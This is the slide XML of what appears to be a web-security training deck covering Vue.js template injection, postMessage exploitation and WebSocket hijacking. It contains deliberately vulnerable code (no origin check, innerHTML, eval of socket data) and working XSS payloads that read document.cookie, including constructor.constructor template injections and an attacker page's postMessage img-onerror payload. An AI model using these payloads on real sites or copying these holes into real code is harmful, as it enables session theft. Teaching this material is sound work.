              <a:gd name="adj" fmla="val 3475"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1519118" y="6078498"/>
            <a:ext cx="5421035" cy="486728"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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https://example.com/welcome?name={{constructor.constructor('alert(1)')()}}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354931" y="6842760"/>
            <a:ext cx="5749409" cy="243364"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> JavaScript alert executes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7533442" y="1785699"/>
            <a:ext cx="3108484" cy="323969"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vue.js Template Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7533442" y="2162294"/>
            <a:ext cx="2159437" cy="269915"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7533442" y="2580203"/>
            <a:ext cx="5749409" cy="1962626"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3697"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524869" y="2580203"/>
            <a:ext cx="5766554" cy="1962626"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1320"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7697629" y="2709743"/>
            <a:ext cx="5421035" cy="1703546"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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new Vue({</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el: '#app',</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data: {</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userInput: location.hash.substring(1)</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  template: '&lt;div&gt;{{userInput}}&lt;/div&gt;'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7533442" y="4690824"/>
            <a:ext cx="2159437" cy="269915"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack URL:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7533442" y="5108734"/>
            <a:ext cx="5749409" cy="745808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9729"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524869" y="5108734"/>
            <a:ext cx="5766554" cy="745808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3475"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7697629" y="5238274"/>
            <a:ext cx="5421035" cy="486728"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>https://example.com/#{{constructor.constructor('alert(document.cookie)')()}}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0094" y="682347"/>
            <a:ext cx="6104096" cy="535781"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.6 PostMessage Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="750094" y="1299091"/>
            <a:ext cx="3504724" cy="401836"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What is PostMessage?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="750094" y="2004655"/>
            <a:ext cx="13130213" cy="333375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>postMessage() allows cross-origin communication between windows/iframes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="750094" y="2768203"/>
            <a:ext cx="2679025" cy="334804"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="750094" y="3330773"/>
            <a:ext cx="6303645" cy="2321719"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3877"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="739378" y="3330773"/>
            <a:ext cx="6325076" cy="2321719"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1385"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953691" y="3491508"/>
            <a:ext cx="5896451" cy="2000250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 Receiver (victim.com)</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window.addEventListener('message', function(event) {</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  // VULNERABLE: No origin check!</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  document.getElementById('output').innerHTML = event.data;</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7584281" y="2768203"/>
            <a:ext cx="2679025" cy="334804"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7584281" y="3330773"/>
            <a:ext cx="6303645" cy="3988594"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2257"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573566" y="3330773"/>
            <a:ext cx="6325076" cy="3988594"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 806"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7787878" y="3491508"/>
            <a:ext cx="5896451" cy="3667125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;!-- Attacker's page (attacker.com) --&gt;</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&lt;iframe id="victim" src="https://victim.com"&gt;&lt;/iframe&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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&lt;script&gt;</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let victim = document.getElementById('victim').contentWindow;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Send malicious payload</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victim.postMessage('&lt;img src=x onerror=alert(document.cookie)&gt;', '*');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/script&gt;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919" y="945833"/>
            <a:ext cx="4667964" cy="489942"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.7 WebSocket Hijacking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685919" y="1859042"/>
            <a:ext cx="5624870" cy="367427"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable WebSocket Implementation:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685919" y="2416850"/>
            <a:ext cx="6390203" cy="4676537"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1760"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="676156" y="2416850"/>
            <a:ext cx="6409730" cy="4676537"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 629"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="872133" y="2563773"/>
            <a:ext cx="6017776" cy="4382691"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Client connects to WebSocket</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let ws = new WebSocket('wss://example.com/chat');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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ws.onopen = function() {</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 VULNERABLE: Sends session token</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ws.send(JSON.stringify({</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type: 'auth',</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token: document.cookie</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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ws.onmessage = function(event) {</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 VULNERABLE: No validation</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eval(event.data);</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7561898" y="1859042"/>
            <a:ext cx="2939653" cy="367427"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7561898" y="2416850"/>
            <a:ext cx="6390203" cy="1754743"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4691"/>
